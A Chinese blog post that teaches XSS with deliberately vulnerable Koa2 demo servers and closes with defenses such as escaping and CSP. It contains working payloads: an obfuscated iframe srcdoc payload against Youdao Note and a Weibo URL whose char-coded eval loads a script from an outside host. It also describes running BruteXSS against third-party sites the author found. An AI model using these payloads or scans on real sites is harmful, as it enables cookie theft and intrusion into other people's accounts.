---
layout: post
title:  "Web 安全防御战 - 浅谈XSS"
date:   2019-06-30
categories: [http, web-secure]
permalink: /archivers/web-secure-xss
tags: [http, web-secure]
---

在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看[HTTP 入门体检](https://lucius0.github.io/2019/06/30/archivers/http-introduction/)，会对以下的内容有所帮助。

## XSS(Cross Site Scripting)

> XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过**脚本注入**的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——[跨站脚本 - 维基百科](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)

### 反射型XSS

> 反射型 XSS，为非持久型，可以把它想象成反射弧。从发起带有XSS脚本的请求，提交到服务端，服务端解析后响应随之返回浏览器，最后浏览器将其响应解析并执行。简单来说，一般都是由 URI 参数直接注入的攻击。

我们用 Koa2 来模拟一下，以下是简单的示例代码：
```js
const Koa = require('koa');
const app = new Koa();

const template = `
  <html>
  <head>
    <meta charset="UTF-8">
    <title>Document</title>
  </head>
  <body>
    #{root}
  </body>
  </html>
`;

app.use(async ctx => {
  ctx.body = template.replace('#{root}', `welcome: ` + ctx.query.xss);
});

app.listen(3000);
```

在下面我们可以看到，浏览器会报错，原因是现代浏览器都会有 XSS 拦截的保护机制(这并不代表因为浏览器帮我们做了而我们就可以忽略 XSS 的知识)。

![](/images/http/xss-01.gif)

因此我们需要在服务器设置响应首部`X-XSS-Protection`。由于我们是要模拟 XSS ，所以我们先关闭 XSS 的保护 `ctx.set('X-XSS-Protection', 0)`，然后就可以看到以下结果，弹出 alert 弹窗。

![](/images/http/xss-02.gif)

除了上面直接执行脚本之外，还可以加载非同源的js文件，嵌入 iframe 页面等等。

### 存储型XSS

>  存储型 XSS，为持久型。跟反射型 XSS 的唯一区别在于是否会保存在服务器，如数据库，内存等。而当别人访问该页面时，就会受到 XSS 代码的攻击。危害相比反射型更加严重，也更隐匿。

我们再次用Koa2来模拟一下，以下是简单的示例代码：

```js
const Koa = require('koa');
const app = new Koa();

const template = `
  <html>
  <head>
    <meta charset="UTF-8">
    <title>Document</title>
  </head>
  <body>
    #{root}
  </body>
  </html>
`;

// 模拟数据库
const database = {
  message: '',
}

app.use(async ctx => {
  let url = ctx.request.url;
  if (url.indexOf('/blog') === 0) {
    database.message = ctx.query.message;
    ctx.body = '发送成功～'
  } else {
    ctx.set('X-XSS-Protection', 0);
    ctx.body = template.replace('#{root}', `来自某某人的消息：` + database.message);
  }
});

app.listen(3000);
```

大概的步骤是模拟类博客那种，黑客利用漏洞向网站发送带有 XSS 攻击脚本到服务器，服务器没有任何的安全校验直接保存到数据库 `database`，当其他用户访问带有该 XSS 脚本的页面时就被攻击了。在这里我们发送一个带用 iframe 劫持的请求到服务器，用户收到响应时就会返回该 iframe 页面。

![](/images/http/xss-03.gif)

### DOM 型 XSS

> DOM 型 XSS，为非持久型，主要是利用前端的代码逻辑漏洞，攻击者植入恶意代码，然后浏览器解析恶意代码后执行造成的 XSS 攻击。

以下是简单的示例代码：

```html
<html>
<head>
  <meta charset="UTF-8">
  <title>Document</title>
</head>
<body>
  DOM 型 XSS
</body>
<script type="text/javascript">
  setTimeout('alert(1)');
  setInterval('alert(2)');
  eval('alert(3)');
</script>
</html>
```

### 常见 XSS 注入点

- HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；
- HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；
- JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；
- 富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本；

### 常见危害
- 获取页面数据；
- 盗取 Cookie，获取敏感信息；
- 劫持前端逻辑；
- 伪装身份，利用可信任来进行不允许的操作；
- 进行 DDoS 攻击；
- ……

### 常见防御方法

- 浏览器自带防御，如我们上面提到的，假如在服务器不设置`X-XSS-Protection`，现代浏览器也一样会为我们拦截大部分的 XSS 攻击(**反射型 XSS，而且只会拦截出现在 HTML 内容或属性中，同时也并不是所有浏览器都支持**)；
- 节点内容转义，一般会在入数据库之前转义或者在展示的时候转义，但是入库之前转义需要**注意的是，1、客户端不仅仅只有Web端，也有iOS等终端，所以可能会导致出现乱码；2、转义后的字符串跟长度跟预期的字符串长度发生变化，如’<‘ 转成 ‘&lt;’，由1个字符变成了4个字符**；

```js
// 展示转义简单处理
function escapeHtml (str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;')
           .replace(/</g, '&lt;')
           .replace(/>/g, '&gt;')
           .replace(/"/g, '&quot;')
           .replace(/'/g, '&#x27;')
           .replace(/\//g, '&#x2F;');
}
```

- JavaScript 内容转义，同理节点内容转义，但是处理方法稍微不同，可以使用`JSON.stringify`来处理；
- Angular / Vue / React，不建议使用 `[innerHTML]/v-html/dangerouslySetInnerHTML` 来插入 html 元素；
- `eval()/setTimeout()/setInterval()`，都是可以直接将字符串当代码段运行；
- 富文本内容转义，相对于节点内容转义跟 JavaScript 内容转义，富文本内容转义比较复杂，但是大多数处理的思路都是相同的，设置转义白名单，对用户输入的内容进行过滤，可以使用 `js-xss` 库；
- CSP(Content-Security-Policy)，可以参考[内容安全策略( CSP ) - HTTP | MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)，后续会说明下CSP策略；

总体来说，我们能做的只是降低 XSS 攻击的风险，XSS 的攻防战一直存在也十分复杂。最后给一下[XSS过滤绕过速查表](http://www.freebuf.com/articles/web/153055.html)，祝大家看得开心（溜了～

## 实战 && 案例

是否你会存在这样的侥幸心理，看完上文后觉得只要进行转义就行了，是的，其实只要进行转义就行了，问题就是从[XSS过滤绕过速查表](http://www.freebuf.com/articles/web/153055.html)看出，过滤规则表还是蛮多的。我们来简单的实战一下。

XSS 检测工具有很多，有**BruteXSS**，**XSSer**，**Beef-XSS**等等，可以说靠自己在本地扫描自己本地项目是否存在 XSS 漏洞了。我们在这里用**BruteXSS**来演示一下，**仅做学习，切勿犯法。**

### 实战

> BruteXSS 是一个根据暴力注入参数的跨站点脚本检测工具，不仅仅支持 GET 请求，还支持 POST 请求。它能从指定的词库中夹在多种 payload 进行注入，并且使用指定的 payload 和扫描检查这些存在的 XSS 漏洞的参数。

我们从 github 下载[BruteXSS](https://github.com/Bosco-Lam/BruteXss)，之所以下载这个是因为它有 wordlist-huge.txt，也就是我们所说的 payload 词库，它约有5000条 payload 脚本。接着我们还需要安装 Python 2.7，`pip install colorama` 和 `pip install Mechanize`。

执行 `python brutexss.py`，正常情况下会出现以下界面：

![](/images/http/xss-04.jpg)

接着，搓搓期待的小手，我们可以到处学(sa)习(ye)了。找了好久好不容易才找到一个，于是我们就开始行动，具体的操作在这里就不讲解了，因为一步一步看操作，很简单。我们找的是使用 `GET` 方法，这类漏洞比较好找，只要对方有输入框即可(现在的浏览器以及网站多多少少都会防御部分XSS，所以不太好找)。

![](/images/http/xss-05.png)

可以看到参数 `q` 有一个遗漏的注入点，于是我们就来试试看，是否真的成效。

![](/images/http/xss-06.png)

(,,#ﾟДﾟ)，没想到居然成了，我试了好多几乎都被后台拦截了，这个居然成了(,,#ﾟДﾟ)。可以看出通过 payload 给出的攻击脚本能顺利的弹出 `1` 这个框。这个就是典型的**反射型 XSS 攻击。**

除此之外，我们还可以利用该工具在一些破破烂烂的边缘网站发帖来实现**存储型 XSS攻击**。但是这个工具也只是辅助工具，并不代表通过该工具扫描不出的就无漏洞，更多攻击者靠的可是**技术以及经验。**

### 案例

> [乌云](http://www.wooyun.org)不在的第三个年头，想它。 ———— 鲁迅

不仅仅是破破烂烂的边缘小网站，也有大公司也存在过 XSS 攻击的案例。

#### 案例1 有道云笔记分享出现 XSS 攻击漏洞

1. 编辑完有道云笔记后保存然后通过**Fiddler**或**Charles**进行抓包；
2. 由于有道云在对 `iframe` 的 `srcdoc` 没做处理，因此可以利用这个弱点来进行注入 payload，然后分享给别人，payload 如下；
3. 修复的方法也很简单，就是对其针对 `iframe` 的 `srcdoc` 加强过滤就行了；

```js
<#<iframe class=&quot;&#x7a;&#x68;&#x6f;&#x75;zhou&quot; src='javAscript:confirm(1111)'/1111111wooyun/)"');' href=`vBscript:msgbox('"');` srcdoc='vBscr&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;ipt:msgbox('"');' alt=`

` yuyangzhou="<iframe" onclick=eval('<script>alert(/martinzhou/)</script>'); style=&quot;font-family:e/* &#*/x/*&#x0000000022;*/p/*&gt;*/r/*onkeydown=*/ession(confirm(5));"iframe>zhou&quot;>5</iframe>

``<div class=" \\'" src=&nbsp;javAscript:confirm('1"');&nbsp; href=`data:q;base64,PHNjcmlwdD5hbGVydCgnQHFhYicpPC9zY3JpcHQ+` srcdoc= javAscript:confirm('1"');  alt="zhou" yuyangzhou=``<div/onmouseover=prompt(1)` onload=alert('1"'); style=&nbsp;font-family:e/*;/*/x/*&#34;*/p/*&quot;*/r/*onclick=*/ession(confirm(0));""`<div/onmouseover=prompt(1)&nbsp;>0</div>
```

#### 案例2 新浪微博反射型 XSS

1. 在新浪微博某个分享页，有这样的一个接口`http://book.weibo.com/newcms/i/weibo_send.php`；
2. 当错误时返回的数据结构为如下；
```js
// 也就是说这个接口会校验`error.referer`
{"code":-1,"message":"\u8bf7\u6c42\u6e90\u4e0d\u5141\u8bb8[http:\/\/error.referer]"}
```
3. 当`error.referer`返回来后页面的响应报文为`Content-Type: text/html; charset=utf-8`，既然错误后的`Content-Type`为`text/html`，那么我们就可以在此做文章；
4. 虽然在 Chrome 和 Firefox 下，referrer 都会被进行 url encode导致无法插入HTML标签。**但是该问题，可以在 IE 进行 XSS 攻击；**
5. 我们在自己的服务器做一些处理，向我们服务器发起请求，即在浏览器地址栏输入如下 URL；
```js
// e=document.createElement("script");e.src="http://a.xxx.xyz/book.weibo.js",document.documentElement.appendChild(e)
// 将上面的转换为 char code 的形式
// 完整 URL 如下
http://a.xxx.xyz/?a=<img src=1 onerror=eval(String.fromCharCode(101,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,101,46,115,114,99,61,34,104,116,116,112,58,47,47,97,46,122,104,99,104,98,105,110,46,120,121,122,47,98,111,111,107,46,119,101,105,98,111,46,106,115,34,44,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,97,112,112,101,110,100,67,104,105,108,100,40,101,41))>
```
6. 请求后我们的服务器会重定向跳转到`http://book.weibo.com/newcms/i/weibo_send.php`，这时候的 `error.referer` 就会被我们植入 XSS 攻击脚本了。

### 小结

可以看到，大多数漏洞都是处于绕来绕去最后发现漏洞的地方没有进行过滤转义处理。正所谓 **攻击千万条，安全第一条。过滤不规范，开发两行泪。**

## 参考

- [跨站脚本 - 维基百科，自由的百科全书](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
- [跨站脚本攻击(Cross-site scripting) - 术语表 | MDN](https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting)
- [内容安全策略( CSP ) - HTTP | MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [Cross-site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))